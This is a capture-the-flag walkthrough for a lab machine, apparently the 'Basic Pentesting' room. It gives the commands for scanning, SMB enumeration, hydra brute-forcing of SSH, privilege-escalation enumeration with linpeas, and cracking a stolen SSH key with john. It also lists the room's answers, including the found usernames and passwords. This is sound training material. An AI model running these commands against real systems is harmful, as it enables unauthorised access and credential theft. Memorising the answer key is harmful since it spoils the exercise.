# Basic Pentesting

Find the services exposed by the machine

`namp -A -sC <TARGET-IP> -oN basic-pentesting-nmap`

[nmap results](./basic-pentesting-nmap)

What is the name of the hidden directory on the web server?

`gobuster dir -u http://<TARGET-IP> -w directory-list-2.3-medium.txt`

development

In /development there are two txt files, one talks about an SMB share and Apache struts 
version 2.5.12, the other talks about weak hashes in /etc/shadow. Two users initials are 
there; J and K.

**User brute-forcing to find username & password**

The text files mention an SMB share, enumerate with `enum4linux -v <TARGET-IP>` 

[enum4linux results](./basic-pentesting-enum4linux)

Found users kay and jan and share Anonymous

Run `hydra -l jan -P rockyou.txt ssh://<TARGET-IP>` to brute-force ssh for jan as the txt 
file mentions the hash being weak

Found jan:armando

**What is the username?**

jan

**What is the password?**

armando

**What service do you use to access the server?**

SSH

**Enumerate the machine to find any vectors for privilege escalation**

Log in via SSH as jan and upload linpeas.sh to the machine.Run linpeash.sh and discover 
readable SSH key, id_rsa, and a password backup, pass.bak, in kay's home dir.

**What is the name of the other user you found?**

kay

**If you have found another user, what can you do with this information?**

Use the other user to elevate privileges by logging in with their SSH key

Run `ssh2john <kay-ssh-key> > hash` and then `john --wordlist=rockyou.txt hash` to crack the 
SSH key's password, beeswax.

SSH into the machine as kay `ssh -i <kay-ssh-key> kay@<TARGET-IP>` and read the password
backup to gain root as kay.

Found `kay:heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

**What is the final password you obtain?**

`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
